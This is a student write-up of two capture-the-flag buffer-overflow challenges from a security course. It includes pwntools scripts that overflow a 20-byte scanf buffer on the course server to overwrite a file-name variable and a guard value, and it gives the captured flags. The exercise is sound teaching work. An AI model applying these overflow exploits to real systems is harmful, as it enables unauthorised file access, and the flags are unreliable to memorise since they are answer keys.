# Trabalho Realizado na Semana 4

## CTF

### Desafio 1

After some time exploring the source code, we found some important information about this executable:

```
- The file mem.txt is opened, read and printed.
- The only way to change which file is read is by overiding the meme_file variable through the scanf function call.
- The scanf function reads 28 bytes to the buffer variable, which has only 20 bytes of space. The other 8 bytes and the ones corresponding to the meme_file variable.
```

We used the scanf function to make a buffer-overflow attack. The following python code was used to get the flag:

```py
#!/usr/bin/python3
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"a" * 20 + b"flag.txt") # Send 20 "trash" bytes and then the value of the file we want to open
r.interactive()
```

Flag:
```
flag{c71a568e127be762a634e6f647175766}
```

### Desafio 2

This challenge had some differences when comparing to the first one:

```
- It has an extra variable val with size equal to 4 bytes
- There is an extra comparison to the val value, before opening the file
- It it aldo vulnerable to buffer overflow attack
```

This attack, even though it is different from the first one, it made in the same way since the `scanf` function scans for the extra 4 bytes of the `val` variable. That said, we just need to overide the `val` and the `meme_file` variables, the first one with `0xfefc2122` and the second with `flag.txt`. Since the variables are written in the stack bottom-up, the bytes of the `val` variable must be set in the reverse order. Using the following python script we can perform this attack and get the flag:

```py
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4000)
r.recvuntil(b":")
r.sendline(b"a" * 20 + b"\x22\x21\xfc\xfe" + b"flag.txt")
r.interactive()
```

Flag:
```
flag{1839859d5fe634c8e2af84c8321f6f54}
```

---

